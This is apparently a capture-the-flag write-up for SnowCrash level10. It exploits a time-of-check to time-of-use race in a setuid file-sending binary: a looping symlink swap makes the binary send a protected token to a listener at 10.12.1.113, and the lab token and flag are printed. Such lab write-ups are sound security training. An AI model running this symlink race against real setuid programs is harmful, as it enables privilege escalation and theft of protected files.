### Exploit



```
    level10@SnowCrash:~$ ./level10 token
    ./level10 file host
	    sends file to host if you have access to it
    level10@SnowCrash:~$ ./level10 token localhost
    You don't have access to token
```
Here's a brand new exploit for you: [TOCTOU race condition](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)

```
    level10@SnowCrash:~$ nm level10
    [...]
    08048620 T _start
            U access@@GLIBC_2.0
    0804a064 b completed.6159
            U connect@@GLIBC_2.0
    0804a044 W data_start
    0804a068 b dtor_idx.6161
            U exit@@GLIBC_2.0
            U fflush@@GLIBC_2.0
    080486b0 t frame_dummy
            U htons@@GLIBC_2.0
            U inet_addr@@GLIBC_2.0
    080486d4 T main
            U open@@GLIBC_2.0
            U printf@@GLIBC_2.0
            U puts@@GLIBC_2.0
            U read@@GLIBC_2.0
            U socket@@GLIBC_2.0
    0804a060 B stdout@@GLIBC_2.0
            U strerror@@GLIBC_2.0
            U write@@GLIBC_2.0
```

```
  level10@SnowCrash:~$ ls -l level10 token
  -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
  -rw-------  1 flag10 flag10     26 Mar  5  2016 token
  level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/key; ln -sf /home/user/level10/level10 /tmp/key; done &
  level10@SnowCrash:~$ while true; do ./level10 /tmp/key 10.12.1.113; done
  You don't have access to /tmp/key
  Connecting to 10.12.1.113:6969 .. Connected!
  Sending file .. wrote file!
  woupa2yuojeeaaed06riuj63c
  level10@SnowCrash:~$ su flag10
  Password:
  Don't forget to launch getflag !
  flag10@SnowCrash:~$ getflag
  Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
